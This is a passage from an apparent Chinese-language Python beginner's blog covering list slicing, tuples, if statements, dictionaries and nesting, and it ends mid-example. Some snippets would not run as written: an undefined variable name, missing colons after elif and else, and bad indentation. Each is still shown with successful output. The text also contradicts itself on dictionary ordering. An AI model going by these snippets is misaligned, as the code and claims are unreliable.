<p>​		复制列表，可以创建一个包含整个列表的切片，方法是同时省略起始索引和终止索引([:])。让Python创建一个起始于第一个元素，终止于最后一个元素的切片，即复制整个列表。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#food.py</span></span><br><span class="line">my_foods=[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>]</span><br><span class="line">friend_foods=my_foods[:]<span class="comment">#[:]不能省略，此时是将my_foods的副本赋给friend_foods。</span></span><br><span class="line"><span class="comment">#如若是friend_foods=my_foods则是将my_foods赋值给friend_foods，两个指向同一个列表。</span></span><br><span class="line"></span><br><span class="line">my_foods.append(<span class="string">&#x27;cannoli&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My favorite foods are:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_foods)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My friend favorite foods are:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(friend_foods)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">My favorite foods are:</span><br><span class="line">[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>,<span class="string">&#x27;cannoli&#x27;</span>]</span><br><span class="line">My friend favorite foods are:</span><br><span class="line">[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><blockquote>
<ol>
<li><p><strong>元组定义概念</strong></p>
<p>​		不可变的列表即为元组（tuple)</p>
</li>
<li><p>操作元组</p>
<ul>
<li><p>定义元组</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions = (<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">50</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>​	遍历元组</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions =(<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">50</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>修改元组的值</p>
<p>​	元组的元素是无法被修改的，但是可以给表示元组的变量进行赋值，重新定义元组</p>
</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions = (<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Orignal dimensions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br><span class="line">                                                                      </span><br><span class="line">dimensions = (<span class="number">400</span>,<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nModified dimensions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Orignal dimensions:</span><br><span class="line">200</span><br><span class="line">50</span><br><span class="line">                                                                      </span><br><span class="line">Modified dimensions:</span><br><span class="line">400</span><br><span class="line">100</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="条件判度if语句"><a href="#条件判度if语句" class="headerlink" title="条件判度if语句"></a>条件判度if语句</h2><h3 id="测试一个条件"><a href="#测试一个条件" class="headerlink" title="测试一个条件"></a>测试一个条件</h3><blockquote>
<p>只适用仅有一个条件满足的情况</p>
</blockquote>
<ul>
<li><p>if语句</p>
<blockquote>
<p>if 条件为true,执行后续程序；条件为false,跳出判断后续代码；</p>
</blockquote>
</li>
<li><p>if-else语句</p>
<blockquote>
<p>if条件为true,执行if后面程序，否则执行else后面程序</p>
</blockquote>
</li>
<li><p>if-elif-else语句</p>
<blockquote>
<p>if 条件为true，执行if后面程序，程序完成跳出条件判断，否则执行elif 判断条件，当条件为true时，执行elif后续程序，程序代码完成跳出判断，否则执行else后面程序代码，执行完成跳出条件判断</p>
</blockquote>
</li>
<li><p>if-elif-elif语句</p>
</li>
</ul>
<h3 id="测试多个条件"><a href="#测试多个条件" class="headerlink" title="测试多个条件"></a>测试多个条件</h3><blockquote>
<p>需要测试多个条件是否满足的情况</p>
</blockquote>
<ul>
<li>if-if-if</li>
</ul>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><h3 id="概念定义-2"><a href="#概念定义-2" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>字典（dictionary)是一系列键值对。每一个键都与值关联，可以使用键来访问相关连的值。在Python中字典用放在花括号“{}”中的一系列键值对来表示的。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#aline.py</span></span><br><span class="line">aline_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(aline_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line">new_points = cline_0[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;You just earned <span class="subst">&#123;new_points&#125;</span> points!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">green</span><br><span class="line">You just earned 5 points!</span><br></pre></td></tr></table></figure></div>

<h3 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h3><blockquote>
<p>字典是一种动态结构，可以随时在其中添加键值对。需要依次指定字典名，用方括号括起来的键和键关联的值。字典会保留定义是的元素排列顺序。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"></span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = <span class="number">0</span></span><br><span class="line">alien_0[<span class="string">&#x27;y_position&#x27;</span>] = <span class="number">25</span></span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:5,<span class="string">&#x27;x_position&#x27;</span>:0,<span class="string">&#x27;y_position&#x27;</span>:25&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>如果需要使用字典来存储用户提供的数据或编写能自动生成大量键值对的代码，通常先创建一个空字典。</p>
</blockquote>
<h3 id="修改字典中的值"><a href="#修改字典中的值" class="headerlink" title="修改字典中的值"></a>修改字典中的值</h3><blockquote>
<p> 要修改字典中的值，可一次指定字典中的键名，用方括号括起来的键和键关联的新值</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;x_position&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;y_position&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="string">&#x27;medium&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Orignal position:<span class="subst">&#123;alien_0[<span class="string">&#x27;x_position&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> alien_0[<span class="string">&#x27;speed&#x27;</span>] == <span class="string">&#x27;slow&#x27;</span>:</span><br><span class="line">	x_increment = <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> alien_0[<span class="string">&#x27;speed&#x27;</span>] == <span class="string">&#x27;medium&#x27;</span></span><br><span class="line">	x_increment = <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	x_increment = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = x_increment + alien_0[<span class="string">&#x27;x_position&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Now position:<span class="subst">&#123;alien_0[<span class="string">&#x27;x_position&#x27;</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Orignal position:0</span><br><span class="line">Now position:2</span><br></pre></td></tr></table></figure></div>

<h3 id="删除键值对-del语句"><a href="#删除键值对-del语句" class="headerlink" title="删除键值对(del语句)"></a>删除键值对(del语句)</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;</span><br><span class="line">    <span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;position&#x27;</span>:<span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> alien_0[<span class="string">&#x27;position&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;position&#x27;</span>:5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>&#125;<span class="comment">#删除后将永久消失</span></span><br></pre></td></tr></table></figure></div>

<h3 id="使用get-访问值"><a href="#使用get-访问值" class="headerlink" title="使用get()访问值"></a>使用get()访问值</h3><p>使用方括号里的键从字典中获取感兴趣的值，可能会引发问题：当指定的键不存在，则会出现错误。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="string">&#x27;slow&#x27;</span>&#125;</span><br><span class="line">print_value = alien_0.get(<span class="string">&#x27;points&#x27;</span>,<span class="string">&#x27;No point value assigned.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(print_value)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>如果字典中有键’points’，则获取键关联的值，否则将获取指定的默认值。</p>
<p>在调用get()函数时，如果没有指定第二个参数且指定的键不存在，则Python将放回None。</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">No point value asigned.</span><br></pre></td></tr></table></figure></div>

<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><ol>
<li><strong>遍历所有的键值对</strong></li>
</ol>
<p>利用for 循环，借用两个变量分别保存键名和值，items()返回键-值对列表</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#user.pu</span></span><br><span class="line">user_0 =&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;efermi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>:<span class="string">&#x27;enrico&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span>:<span class="string">&#x27;fermi&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n key:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n value:<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">key: last</span><br><span class="line">Value: fermi</span><br><span class="line">Key: first</span><br><span class="line">Value: enrico</span><br><span class="line">Key: username</span><br><span class="line">Value: efermi</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>注意，即便遍历字典时，键—值对的返回顺序也与存储顺序不同。Python不关心键—值对的存<br>储顺序，而只跟踪键和值之间的关联关系。</p>
</blockquote>
<ol start="2">
<li><strong>遍历所有的键</strong></li>
</ol>
<blockquote>
<p>利用for 循环，用一个变量保存字典的键名，keys()</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">	<span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>提取字典favorite_languages中的所有键，并依次将它们存储到变量name中。输出列出了每个被调查者的名字：</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jen</span><br><span class="line">Sarah</span><br><span class="line">Phil</span><br><span class="line">Edward</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>遍历字典时，会默认遍历所有的键.</p>
<p>因此，如果将上述代码中的for name in favorite_languages.keys():替换为for name in favorite_languages:，输出将不变。</p>
</blockquote>
<ul>
<li><p>按顺序遍历字典中的所有键</p>
<p>字典总是明确地记录键和值之间的关联关系，但获取字典的元素时，获取顺序是不可预测的。</p>
<p>要以特定的顺序返回元素，一种办法是在for循环中对返回的键进行排序。为此，可使用函<br>数sorted()来获得按特定顺序排列的键列表的副本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">sorted</span>(favorite_languages.keys()):</span><br><span class="line">	<span class="built_in">print</span>(name.title() + <span class="string">&quot;, thank you for taking the poll.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>dictionary.keys()的结果调用了函数sorted()。这让Python列出字典中的所有键，并在遍历前对这个列表进行排序。输出表明，按顺序显示了所有被调查者的名字：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Edward, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Jen, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Phil, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Sarah, thank you <span class="keyword">for</span> taking the poll.</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="遍历字典中的所有值"><a href="#遍历字典中的所有值" class="headerlink" title="遍历字典中的所有值"></a>遍历字典中的所有值</h3><p>利用for循环，用一个变量存储字典的值，values();set()集合，剔除重复项。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The following languages have been mentioned:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> language <span class="keyword">in</span> <span class="built_in">set</span>(favorite_languages.values()):</span><br><span class="line">    <span class="comment">#为剔除重复项，可使用集合（set）。集合类似于列表，但每个元素都必须是独一无二的：</span></span><br><span class="line">    <span class="built_in">print</span>(language.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">The following languages have been mentioned:</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">Ruby</span><br></pre></td></tr></table></figure></div>

<h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><blockquote>
<p>可以在列表中嵌套字典、在字典中嵌套列表，可以在字典中嵌套字典。</p>
</blockquote>
<h3 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>&#125;</span><br><span class="line">alien_1 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">10</span>&#125;</span><br><span class="line">alien_2 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">15</span>&#125;</span><br><span class="line">aliens = [alien_0, alien_1, alien_2]</span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens:</span><br><span class="line">	<span class="built_in">print</span>(alien)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;points&#x27;: 10&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;red&#x27;, &#x27;points&#x27;: 15&#125;</span><br></pre></td></tr></table></figure></div>

<p>将前三个外星人修改为黄色的、速度为中等且值10个点</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line"><span class="comment"># 创建一个用于存储外星人的空列表</span></span><br><span class="line">aliens = []</span><br><span class="line"><span class="comment"># 创建30个绿色的外星人</span></span><br><span class="line"><span class="keyword">for</span> alien_number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line"> new_alien = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>&#125;</span><br><span class="line"> aliens.append(new_alien)</span><br><span class="line"><span class="comment">#将前三个外星人修改为黄色的、速度为中等且值10个点</span></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">    <span class="keyword">if</span> alien[<span class="string">&#x27;color&#x27;</span>] == <span class="string">&#x27;green&#x27;</span>:</span><br><span class="line">        alien[<span class="string">&#x27;color&#x27;</span>] = <span class="string">&#x27;yellow&#x27;</span></span><br><span class="line">        alien[<span class="string">&#x27;speed&#x27;</span>] = <span class="string">&#x27;medium&#x27;</span></span><br><span class="line">        alien[<span class="string">&#x27;points&#x27;</span>] = <span class="number">10</span></span><br><span class="line"><span class="comment"># 显示前五个外星人</span></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens[:<span class="number">5</span>]:</span><br><span class="line">    <span class="built_in">print</span>(alien)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;...&quot;</span>)</span><br><span class="line"><span class="comment"># 显示创建了多少个外星人</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Total number of aliens: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(aliens)))</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 5&#125;</span><br><span class="line">...</span><br><span class="line">Total number of aliens: 30</span><br></pre></td></tr></table></figure></div>

<h3 id="字典中存储列表"><a href="#字典中存储列表" class="headerlink" title="字典中存储列表"></a>字典中存储列表</h3><blockquote>
<p>在字典中将一个键关联到多个值时，可以在字典中嵌套一个列表.</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Pizza.py</span></span><br><span class="line"><span class="comment"># 存储所点比萨的信息</span></span><br><span class="line"> pizza = &#123;</span><br><span class="line"><span class="string">&#x27;crust&#x27;</span>: <span class="string">&#x27;thick&#x27;</span>,<span class="comment">#薄厚程度</span></span><br><span class="line"><span class="string">&#x27;toppings&#x27;</span>: [<span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>],<span class="comment">#顾客要求添加的所有配料</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 概述所点的比萨</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;You ordered a &quot;</span> + pizza[<span class="string">&#x27;crust&#x27;</span>] + <span class="string">&quot;-crust pizza &quot;</span> +</span><br><span class="line"><span class="string">&quot;with the following toppings:&quot;</span>)</span><br><span class="line"> <span class="keyword">for</span> topping <span class="keyword">in</span> pizza[<span class="string">&#x27;toppings&#x27;</span>]:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\t&quot;</span> + topping)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">You ordered a thick-crust pizza with the following toppings:</span><br><span class="line">    mushrooms</span><br><span class="line">    extra cheese</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;ruby&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: [<span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: [<span class="string">&#x27;ruby&#x27;</span>, <span class="string">&#x27;go&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;haskell&#x27;</span>],</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name, languages <span class="keyword">in</span> favorite_languages.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + name.title() + <span class="string">&quot;&#x27;s favorite languages are:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> language <span class="keyword">in</span> languages:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;\t&quot;</span> + language.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jen<span class="string">&#x27;s favorite languages are:</span></span><br><span class="line"><span class="string">    Python</span></span><br><span class="line"><span class="string">    Ruby</span></span><br><span class="line"><span class="string">Sarah&#x27;</span>s favorite languages are:</span><br><span class="line">    C</span><br><span class="line">Phil<span class="string">&#x27;s favorite languages are:</span></span><br><span class="line"><span class="string">    Python</span></span><br><span class="line"><span class="string">    Haskell</span></span><br><span class="line"><span class="string">Edward&#x27;</span>s favorite languages are:</span><br><span class="line">    Ruby</span><br><span class="line">    Go</span><br></pre></td></tr></table></figure></div>

<h3 id="字典中存储字典"><a href="#字典中存储字典" class="headerlink" title="字典中存储字典"></a>字典中存储字典</h3><blockquote>
<p>例如，如果有多个网站用户，每个都有独特的用户名，可在字典中将用户名作为键，然后将每位用户的信息存储在一个字典中，并将该字典作为与用户名相关联的值。在下面的程序中，对于每位用户，我们都存储了其三项信息：名、姓和居地；为访问这些信息，我们遍历所有的用户名，并访问与每个用户名相关联的信息字典：</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#many_users.py</span></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;aeinstein&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;albert&#x27;</span>,<span class="comment">#名字</span></span><br><span class="line">        <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;einstein&#x27;</span>,<span class="comment">#姓氏</span></span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;princeton&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;mcurie&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;marie&#x27;</span>,<span class="comment">#名字</span></span><br><span class="line">        <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;curie&#x27;</span>,<span class="comment">#姓氏</span></span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;paris&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> username, user_info 